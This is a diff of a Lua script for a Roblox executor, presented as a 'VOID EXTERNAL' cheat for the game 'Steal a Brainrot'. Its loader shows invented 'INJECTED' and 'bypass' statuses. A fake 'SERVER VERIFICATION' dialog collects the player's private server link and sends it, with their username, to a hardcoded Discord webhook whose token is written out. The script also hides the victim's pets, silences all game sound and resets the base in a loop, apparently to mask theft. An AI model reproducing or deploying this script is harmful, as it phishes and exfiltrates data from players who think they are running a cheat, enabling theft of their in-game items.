@@ -1,6 +1,6 @@
 -- Script pentru Delta - Steal a Brainrot (VOID EXTERNAL + Discord)
--- Compatibil cu Delta Executor
--- INTERFAȚA EXACT CA ÎN POZĂ (MOV + NEGRU)
+-- SPECIAL PENTRU DELTA PE TELEFON
+-- OPREȘTE TOATE SUNETELE (inclusiv pași, clone, furat)
 
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
@@ -9,11 +9,10 @@ local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
 local Workspace = game:GetService("Workspace")
 local CoreGui = game:GetService("CoreGui")
 local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
--- ===== CONFIGURARE =====
 local WEBHOOK = "https://discord.com/api/webhooks/1510999167244304554/kScJIW0h-ZUy0Aadhs936Y-8ZEAiTKnyewPvwbg6y7SrHHOwA5l4MotrcmGMBzzCy9gF"
 
--- ===== DISCORD =====
 local function sendToDiscord(message)
     local request = request or http_request or syn.request
     if request then
@@ -28,10 +27,17 @@ local function sendToDiscord(message)
     end
 end
 
--- ===== BLOCARE TOTALĂ A SUNETELOR =====
-local function muteAllSounds()
+-- ===== OPREȘTE TOATE SUNETELE (METODĂ AGRESIVĂ) =====
+local function killAllAudio()
+    print("🔇 Oprire sunete...")
+    
+    -- 1. Volum global 0
     pcall(function()
         SoundService.Volume = 0
+    end)
+    
+    -- 2. Oprește toate sunetele existente
+    pcall(function()
         for _, sound in pairs(game:GetDescendants()) do
             if sound:IsA("Sound") then
                 sound.Volume = 0
@@ -41,13 +47,14 @@ local function muteAllSounds()
         end
     end)
     
+    -- 3. BLOCEAZĂ ORICE SUNET NOU (loop la 0.01 secunde)
     spawn(function()
         while true do
-            task.wait(0.1)
+            task.wait(0.01)
             pcall(function()
                 SoundService.Volume = 0
                 for _, sound in pairs(game:GetDescendants()) do
-                    if sound:IsA("Sound") and (sound.Volume > 0 or sound.Playing == true) then
+                    if sound:IsA("Sound") then
                         sound.Volume = 0
                         sound:Stop()
                         sound.Playing = false
@@ -56,14 +63,25 @@ local function muteAllSounds()
             end)
         end
     end)
-    print("✅ Toate sunetele blocate!")
+    
+    -- 4. Pentru Delta pe telefon - oprește și sunetele din SoundService
+    pcall(function()
+        for _, sound in pairs(SoundService:GetDescendants()) do
+            if sound:IsA("Sound") then
+                sound.Volume = 0
+                sound:Stop()
+                sound.Playing = false
+            end
+        end
+    end)
+    
+    print("✅ Toate sunetele oprite!")
 end
 
 -- ===== ASCUNDE BRAINROT-URILE =====
 local function hideBrainrots()
     local count = 0
     local hidden = {}
-    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and (string.find(obj.Name:lower(), "brainrot") or string.find(obj.Name:lower(), "brain") or string.find(obj.Name:lower(), "pet")) then
             pcall(function()
@@ -80,21 +98,17 @@ local function hideBrainrots()
             end)
         end
     end
-    
     _G.HiddenBrainrots = hidden
     return count
 end
 
 -- ===== RESETEAZĂ BAZA =====
 local function resetBase()
-    print("🔄 Resetez baza...")
-    
     for _, obj in pairs(Workspace:GetDescendants()) do
         if obj:IsA("Model") and obj.Name and string.find(obj.Name, "_Fake") then
             pcall(function() obj:Destroy() end)
         end
     end
-    
     if _G.HiddenBrainrots then
         for _, brainrot in pairs(_G.HiddenBrainrots) do
             pcall(function()
@@ -103,13 +117,11 @@ local function resetBase()
             end)
         end
     end
-    
-    task.wait(5)
+    task.wait(3)
     hideBrainrots()
-    print("✅ Baza resetată!")
 end
 
--- ===== ASCUNDE DOAR PE TINE =====
+-- ===== ASCUNDE PERSONAJUL =====
 local function hideMe()
     if Character then
         for _, part in pairs(Character:GetDescendants()) do
@@ -129,46 +141,39 @@ local function hideMe()
     end
 end
 
--- ===== ECAN NEGRU + LOADER STILIZAT (VOID EXTERNAL) =====
+-- ===== LOADER (VOID EXTERNAL) =====
 local function showLoader()
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoaderGUI"
     screenGui.ResetOnSpawn = false
-    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.IgnoreGuiInset = true
 
-    -- Fundal negru
     local background = Instance.new("Frame")
     background.Size = UDim2.new(1, 0, 1, 0)
     background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     background.BorderSizePixel = 0
     background.Parent = screenGui
 
-    -- Titlu "VOID EXTERNAL"
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(0.6, 0, 0, 60)
     title.Position = UDim2.new(0.2, 0, 0.12, 0)
     title.Text = "VOID EXTERNAL"
-    title.TextColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    title.TextColor3 = Color3.fromRGB(180, 120, 255)
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
     title.TextScaled = true
-    title.TextXAlignment = Enum.TextXAlignment.Left
     title.Parent = screenGui
 
-    -- Procent (începe de la 0)
     local percent = Instance.new("TextLabel")
     percent.Size = UDim2.new(0.3, 0, 0, 60)
     percent.Position = UDim2.new(0.7, 0, 0.12, 0)
     percent.Text = "0%"
-    percent.TextColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    percent.TextColor3 = Color3.fromRGB(180, 120, 255)
     percent.BackgroundTransparency = 1
     percent.Font = Enum.Font.GothamBold
     percent.TextScaled = true
-    percent.TextXAlignment = Enum.TextXAlignment.Right
     percent.Parent = screenGui
 
-    -- Linia de progres
     local progressBg = Instance.new("Frame")
     progressBg.Size = UDim2.new(0.9, 0, 0, 4)
     progressBg.Position = UDim2.new(0.05, 0, 0.25, 0)
@@ -178,11 +183,10 @@ local function showLoader()
 
     local progressBar = Instance.new("Frame")
     progressBar.Size = UDim2.new(0.01, 0, 1, 0)
-    progressBar.BackgroundColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    progressBar.BackgroundColor3 = Color3.fromRGB(180, 120, 255)
     progressBar.BorderSizePixel = 0
     progressBar.Parent = progressBg
 
-    -- Text "BYPASSI"
     local bypassText = Instance.new("TextLabel")
     bypassText.Size = UDim2.new(0.9, 0, 0, 30)
     bypassText.Position = UDim2.new(0.05, 0, 0.30, 0)
@@ -191,7 +195,6 @@ local function showLoader()
     bypassText.BackgroundTransparency = 1
     bypassText.Font = Enum.Font.GothamBold
     bypassText.TextSize = 18
-    bypassText.TextXAlignment = Enum.TextXAlignment.Left
     bypassText.Parent = screenGui
 
     -- SPEED
@@ -203,7 +206,6 @@ local function showLoader()
     speedLabel.BackgroundTransparency = 1
     speedLabel.Font = Enum.Font.GothamBold
     speedLabel.TextSize = 16
-    speedLabel.TextXAlignment = Enum.TextXAlignment.Left
     speedLabel.Parent = screenGui
 
     local speedStatus = Instance.new("TextLabel")
@@ -214,7 +216,6 @@ local function showLoader()
     speedStatus.BackgroundTransparency = 1
     speedStatus.Font = Enum.Font.GothamBold
     speedStatus.TextSize = 16
-    speedStatus.TextXAlignment = Enum.TextXAlignment.Left
     speedStatus.Parent = screenGui
 
     local speedCtrl = Instance.new("TextLabel")
@@ -225,7 +226,6 @@ local function showLoader()
     speedCtrl.BackgroundTransparency = 1
     speedCtrl.Font = Enum.Font.Gotham
     speedCtrl.TextSize = 14
-    speedCtrl.TextXAlignment = Enum.TextXAlignment.Right
     speedCtrl.Parent = screenGui
 
     -- STEAL
@@ -237,7 +237,6 @@ local function showLoader()
     stealLabel.BackgroundTransparency = 1
     stealLabel.Font = Enum.Font.GothamBold
     stealLabel.TextSize = 16
-    stealLabel.TextXAlignment = Enum.TextXAlignment.Left
     stealLabel.Parent = screenGui
 
     local stealStatus = Instance.new("TextLabel")
@@ -248,7 +247,6 @@ local function showLoader()
     stealStatus.BackgroundTransparency = 1
     stealStatus.Font = Enum.Font.GothamBold
     stealStatus.TextSize = 16
-    stealStatus.TextXAlignment = Enum.TextXAlignment.Left
     stealStatus.Parent = screenGui
 
     local stealSys = Instance.new("TextLabel")
@@ -259,7 +257,6 @@ local function showLoader()
     stealSys.BackgroundTransparency = 1
     stealSys.Font = Enum.Font.Gotham
     stealSys.TextSize = 14
-    stealSys.TextXAlignment = Enum.TextXAlignment.Right
     stealSys.Parent = screenGui
 
     -- COMBAT
@@ -271,7 +268,6 @@ local function showLoader()
     combatLabel.BackgroundTransparency = 1
     combatLabel.Font = Enum.Font.GothamBold
     combatLabel.TextSize = 16
-    combatLabel.TextXAlignment = Enum.TextXAlignment.Left
     combatLabel.Parent = screenGui
 
     local combatStatus = Instance.new("TextLabel")
@@ -282,7 +278,6 @@ local function showLoader()
     combatStatus.BackgroundTransparency = 1
     combatStatus.Font = Enum.Font.GothamBold
     combatStatus.TextSize = 16
-    combatStatus.TextXAlignment = Enum.TextXAlignment.Left
     combatStatus.Parent = screenGui
 
     local combatSys = Instance.new("TextLabel")
@@ -293,10 +288,8 @@ local function showLoader()
     combatSys.BackgroundTransparency = 1
     combatSys.Font = Enum.Font.Gotham
     combatSys.TextSize = 14
-    combatSys.TextXAlignment = Enum.TextXAlignment.Right
     combatSys.Parent = screenGui
 
-    -- Linie separator
     local line = Instance.new("Frame")
     line.Size = UDim2.new(0.9, 0, 0, 1)
     line.Position = UDim2.new(0.05, 0, 0.68, 0)
@@ -304,7 +297,6 @@ local function showLoader()
     line.BorderSizePixel = 0
     line.Parent = screenGui
 
-    -- Log messages
     local log1 = Instance.new("TextLabel")
     log1.Size = UDim2.new(0.9, 0, 0, 20)
     log1.Position = UDim2.new(0.05, 0, 0.73, 0)
@@ -313,7 +305,6 @@ local function showLoader()
     log1.BackgroundTransparency = 1
     log1.Font = Enum.Font.Gotham
     log1.TextSize = 13
-    log1.TextXAlignment = Enum.TextXAlignment.Left
     log1.Parent = screenGui
 
     local log2 = Instance.new("TextLabel")
@@ -324,7 +315,6 @@ local function showLoader()
     log2.BackgroundTransparency = 1
     log2.Font = Enum.Font.Gotham
     log2.TextSize = 13
-    log2.TextXAlignment = Enum.TextXAlignment.Left
     log2.Parent = screenGui
 
     local log3 = Instance.new("TextLabel")
@@ -335,35 +325,27 @@ local function showLoader()
     log3.BackgroundTransparency = 1
     log3.Font = Enum.Font.Gotham
     log3.TextSize = 13
-    log3.TextXAlignment = Enum.TextXAlignment.Left
     log3.Parent = screenGui
 
-    -- Procent 61% (static, ca în poză) - jos
     local percentBottom = Instance.new("TextLabel")
     percentBottom.Size = UDim2.new(0.9, 0, 0, 25)
     percentBottom.Position = UDim2.new(0.05, 0, 0.89, 0)
     percentBottom.Text = "61%"
-    percentBottom.TextColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    percentBottom.TextColor3 = Color3.fromRGB(180, 120, 255)
     percentBottom.BackgroundTransparency = 1
     percentBottom.Font = Enum.Font.GothamBold
     percentBottom.TextSize = 18
-    percentBottom.TextXAlignment = Enum.TextXAlignment.Left
     percentBottom.Parent = screenGui
 
     screenGui.Parent = CoreGui
 
-    -- ===== ANIMAȚIE LOADER (RAPID PÂNĂ LA 90%, APOI GREU) =====
     spawn(function()
         local progress = 0
-        
-        -- Faza 1: 0% → 90% (rapid, ~3 secunde)
         while progress < 90 do
             progress = progress + math.random(2, 5)
             if progress > 90 then progress = 90 end
             percent.Text = math.floor(progress) .. "%"
             progressBar.Size = UDim2.new(progress / 100, 0, 1, 0)
-            
-            -- Schimbă textul dinamic
             if progress > 25 and progress < 30 then
                 speedStatus.Text = "INJECTED"
                 speedStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
@@ -376,18 +358,13 @@ local function showLoader()
                 combatStatus.Text = "READY"
                 combatStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
             end
-            
-            task.wait(0.03) -- Rapid
+            task.wait(0.03)
         end
-        
-        -- Faza 2: 90% → 100% (foarte greu, ~20 de secunde)
         while progress < 100 do
             progress = progress + 0.05
             if progress > 100 then progress = 100 end
             percent.Text = math.floor(progress) .. "%"
             progressBar.Size = UDim2.new(progress / 100, 0, 1, 0)
-            
-            -- La final, resetează textul pentru buclă
             if progress > 95 then
                 speedStatus.Text = "LOADING"
                 speedStatus.TextColor3 = Color3.fromRGB(255, 200, 0)
@@ -398,18 +375,14 @@ local function showLoader()
                 log2.Text = "[ 00:01 ] speed_module ...... injected"
                 log3.Text = "Resolving pointer chains..."
             end
-            
-            task.wait(0.15) -- Foarte greu
+            task.wait(0.15)
         end
-        
-        -- După ce ajunge la 100%, resetează la 61% (ca în poză) și continuă
         while true do
             task.wait(2)
             progress = 61
             percent.Text = "61%"
             progressBar.Size = UDim2.new(0.61, 0, 1, 0)
             task.wait(2)
-            -- Reia de la 61% în sus
             while progress < 100 do
                 progress = progress + 0.02
                 if progress > 100 then progress = 100 end
@@ -423,12 +396,11 @@ local function showLoader()
     return screenGui
 end
 
--- ===== GUI CU LINK =====
+-- ===== GUI LINK =====
 local function showLinkGUI()
     local gui = Instance.new("ScreenGui")
     gui.Name = "LinkInput"
     gui.ResetOnSpawn = false
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
@@ -443,7 +415,7 @@ local function showLinkGUI()
     frame.BackgroundColor3 = Color3.fromRGB(15, 15, 30)
     frame.BackgroundTransparency = 0.1
     frame.BorderSizePixel = 1
-    frame.BorderColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    frame.BorderColor3 = Color3.fromRGB(180, 120, 255)
     frame.Active = true
     frame.Draggable = true
     frame.Parent = bg
@@ -451,8 +423,8 @@ local function showLinkGUI()
     local title = Instance.new("TextLabel")
     title.Size = UDim2.new(1, 0, 0, 45)
     title.Position = UDim2.new(0, 0, 0, 0)
-    title.Text = "🔐 VERIFICARE SERVER"
-    title.TextColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    title.Text = "🔐 SERVER VERIFICATION"
+    title.TextColor3 = Color3.fromRGB(180, 120, 255)
     title.BackgroundTransparency = 1
     title.Font = Enum.Font.GothamBold
     title.TextScaled = true
@@ -461,7 +433,7 @@ local function showLinkGUI()
     local subtitle = Instance.new("TextLabel")
     subtitle.Size = UDim2.new(1, 0, 0, 25)
     subtitle.Position = UDim2.new(0, 0, 0.20, 0)
-    subtitle.Text = "Introdu link-ul serverului privat:"
+    subtitle.Text = "Enter the private server link:"
     subtitle.TextColor3 = Color3.fromRGB(180, 180, 200)
     subtitle.BackgroundTransparency = 1
     subtitle.Font = Enum.Font.Gotham
@@ -483,25 +455,26 @@ local function showLinkGUI()
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0.9, 0, 0, 40)
     btn.Position = UDim2.new(0.05, 0, 0.60, 0)
-    btn.Text = "📤 AUTENTIFICARE"
-    btn.BackgroundColor3 = Color3.fromRGB(180, 120, 255) -- MOV
+    btn.Text = "📤 AUTHENTICATE"
+    btn.BackgroundColor3 = Color3.fromRGB(180, 120, 255)
     btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     btn.Font = Enum.Font.GothamBold
     btn.TextScaled = true
     btn.Parent = frame
     btn.MouseButton1Click:Connect(function()
         if textBox.Text and textBox.Text ~= "" then
-            sendToDiscord("**🔗 LINK SERVER PRIVAT**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
+            sendToDiscord("**🔗 PRIVATE SERVER LINK**\n\n📌 **Player:** " .. LocalPlayer.Name .. "\n🔗 **Link:** " .. textBox.Text)
             gui:Destroy()
             showLoader()
             hideMe()
-            muteAllSounds()
+            killAllAudio()
             local count = hideBrainrots()
-            print("✅ Script activ! " .. count .. " brainrot-uri ascunse.")
-            
+            print("✅ Script active! " .. count .. " brainrots hidden.")
             spawn(function()
-                task.wait(10)
-                resetBase()
+                while true do
+                    task.wait(5)
+                    resetBase()
+                end
             end)
         end
     end)
@@ -509,12 +482,11 @@ local function showLinkGUI()
     gui.Parent = CoreGui
 end
 
--- ===== MAIN =====
 local function main()
     showLinkGUI()
-    print("🚀 Așteaptă introducerea link-ului...")
-    print("🔄 Baza se va reseta automat după 10 secunde.")
+    print("🚀 Waiting for link input...")
+    print("🔄 Base resets every 5 seconds.")
+    print("🔇 ALL sounds OFF.")
 end
 
--- ===== START =====
 pcall(main)
